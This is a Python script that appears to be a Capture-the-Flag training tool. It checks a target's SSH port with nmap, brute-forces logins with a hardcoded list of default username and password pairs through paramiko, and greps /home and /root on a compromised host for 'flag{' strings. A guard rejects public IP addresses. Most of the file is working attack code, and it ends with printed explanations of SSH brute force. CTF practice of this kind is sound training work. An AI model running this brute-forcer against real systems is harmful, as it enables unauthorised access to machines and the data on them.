import os
import sys
import paramiko
import subprocess
import logging
import ipaddress

# Ensure necessary directories exist
os.makedirs("logs", exist_ok=True)
os.makedirs("outputs", exist_ok=True)

# Setup Logging
LOG_FILE = "logs/exploit_errors.log"
FLAG_OUTPUT_FILE = "outputs/flag_results.txt"

# Configure logging
logging.basicConfig(filename=LOG_FILE, level=logging.INFO,
                    format="%(asctime)s - %(levelname)s - %(message)s")

def log_error(message):
    """Log an error message to the log file and print it to the console, then exit."""
    logging.error(message)
    print(f"\n‚ö† ERROR: {message}")
    print(f"‚ö† The error has been logged in: {LOG_FILE}")
    sys.exit(1)

def check_ip_public(ip_address):
    """Check if the IP address is public and log an error if so."""
    try:
        ip = ipaddress.ip_address(ip_address)
        if ip.is_global:
            log_error(f"Unauthorized scan attempt on public IP address {ip}. Exiting.")
    except ValueError:
        log_error(f"Invalid IP address {ip_address}. Exiting.")

def check_ip_input(ip_address):
    """Check if the IP address input is empty."""
    if not ip_address.strip():
        log_error("Target IP required. Please try again.")

# **Password List**
USER_PASSWORD_LIST = [
    ("admin", "admin"), ("admin", "123456"), ("admin", "password"),
    ("user", "password"), ("user", "123456"), ("root", "toor"),
    ("root", "root"), ("root", "admin"), ("root", "12345"),
    ("test", "test"), ("kali", "kali"), ("admin", "qwerty"),
    ("admin", "letmein"), ("admin", "1234"), ("admin", "welcome"),
    ("guest", "guest"), ("support", "support"), ("mysql", "mysql"),
    ("ftp", "ftp"), ("webadmin", "webadmin"), ("oracle", "oracle"),
    ("apache", "apache"), ("ssh", "ssh"), ("backup", "backup"),
    ("manager", "manager"), ("admin", "changeme"), ("root", "changeme"),
    ("admin", "SuperSecurePassword"), ("root", "rasitha")
]

def check_ssh_open(target_ip):
    """Check if SSH port 22 is open using Nmap."""
    print(f"\nüîç Checking if SSH is open on {target_ip}...")
    command = f"nmap -p 22 {target_ip}"
    result = subprocess.run(command, shell=True, capture_output=True, text=True)
    return "22/tcp open" in result.stdout

def attempt_ssh_login(target_ip, username, password):
    """Attempt SSH login with a given username and password."""
    try:
        client = paramiko.SSHClient()
        client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        client.connect(target_ip, username=username, password=password, timeout=5)
        print(f"\n‚úÖ SUCCESS! Logged in with {username}:{password}")
        logging.info(f"SSH access gained with {username}:{password} on {target_ip}")
        return True, client, username, password
    except paramiko.AuthenticationException:
        print(f"‚ùå Failed: {username}:{password}")
        return False, None, None, None
    except paramiko.SSHException as e:
        log_error(f"SSH Error: {e}")
        return False, None, None, None
    except Exception as e:
        log_error(f"Unexpected error: {e}")
        return False, None, None, None

def try_default_passwords(target_ip):
    """Try a list of common passwords and return success status."""
    print("\nüîç Attempting login with default credentials...")
    for username, password in USER_PASSWORD_LIST:
        success, client, user, pwd = attempt_ssh_login(target_ip, username, password)
        if success:
            return True, client, user, pwd
    return False, None, None, None

def search_for_flags(client):
    """Search for flag patterns in files after SSH login."""
    if client is None:
        log_error("SSH connection was lost. Cannot search for flags.")

    print("\nüîç Searching for flags...")
    try:
        stdin, stdout, stderr = client.exec_command("grep -ir 'flag{' /home /root 2>/dev/null")
        flag_results = stdout.read().decode().strip()

        if flag_results:
            print(f"\nüéØ Flags Found:\n{flag_results}")
            with open(FLAG_OUTPUT_FILE, "w") as file:
                file.write(flag_results)
            print(f"‚úÖ Flags saved in {FLAG_OUTPUT_FILE}")
            logging.info(f"Flags found: {flag_results}")
        else:
            print("\n‚ùå No flags found.")
            logging.info("No flags found.")
    except Exception as e:
        log_error(f"Error while searching for flags: {e}")

def main():
    """Main function to execute SSH attack techniques."""
    while True:
        print("\nüöÄ Choose an Option üöÄ")
        print("1. Gain SSH Access using Brute Force")
        print("2. Find Flags in SSH")
        print("3. Exit")

        choice = input("\nEnter your choice (1/2/3): ").strip()

        if choice == "1":
            print("\nüöÄ Automated SSH Access Attempt Tool üöÄ")
            target_ip = input("Enter the target machine's IP address: ").strip()
            check_ip_input(target_ip)
            check_ip_public(target_ip)

            if check_ssh_open(target_ip):
                success, client, username, password = try_default_passwords(target_ip)
                if success:
                    print("\n‚úÖ Successfully gained SSH access!")
                else:
                    print("\n‚ùå No valid credentials found.")
            else:
                print("\n‚ùå SSH port is closed.")

        elif choice == "2":
            print("\nüîç Searching for flags in SSH...")
            target_ip = input("Enter the target machine's IP address: ").strip()
            username = input("Enter SSH username: ").strip()
            password = input("Enter SSH password: ").strip()

            try:
                client = paramiko.SSHClient()
                client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                client.connect(target_ip, username=username, password=password, timeout=5)
                search_for_flags(client)
                client.close()
            except Exception as e:
                log_error(f"Error connecting to SSH: {e}")

        elif choice == "3":
            print("\nExiting tool...")
            sys.exit(0)
        else:
            print("\n‚ùå Invalid choice. Please enter 1, 2, or 3.")

if __name__ == "__main__":
    main()

# Explanation for the user
print("\n========== What the code has done ==========")
print("1. The tool first checks if the provided IP address is a valid private IP.")
print("2. It checks whether the target system has the SSH port (22) open using Nmap.")
print("3. The tool attempts SSH login using a list of common username and password combinations.")
print("4. If SSH login is successful, the tool searches for any flags on the system by looking for files that contain the string 'flag{' (common in Capture the Flag challenges).")
print("5. If flags are found, the results are displayed and saved to a file for further review.")
print("6. If no flags are found or an error occurs during any of the steps, the tool logs the information and provides feedback.")

print("\n========== What is SSH Brute Force? ==========")
print("SSH Brute Force is an attack method where the attacker tries multiple username and password combinations until a valid set is found. The attacker attempts to gain unauthorized access to the target system via the SSH protocol.")
print("This attack can be automated using a tool that tries many common username-password combinations in a short amount of time.")

print("\n========== How is SSH Brute Force used in this tool? ==========")
print("In this tool, SSH brute force is used by trying a list of default and common usernames and passwords against the target system's SSH service. If the credentials are correct, SSH access is gained.")
print("Once access is gained, the tool searches for flags or sensitive information on the system.")

print("\n========== What is a Flag in Capture the Flag (CTF)? ==========")
print("In CTF challenges, a flag is a hidden piece of data (often in the form of a string) that participants must find to demonstrate their success in completing a challenge.")
print("The flags usually contain unique strings, such as 'flag{...}', which are indicative of a successful exploitation or discovery of vulnerabilities.")

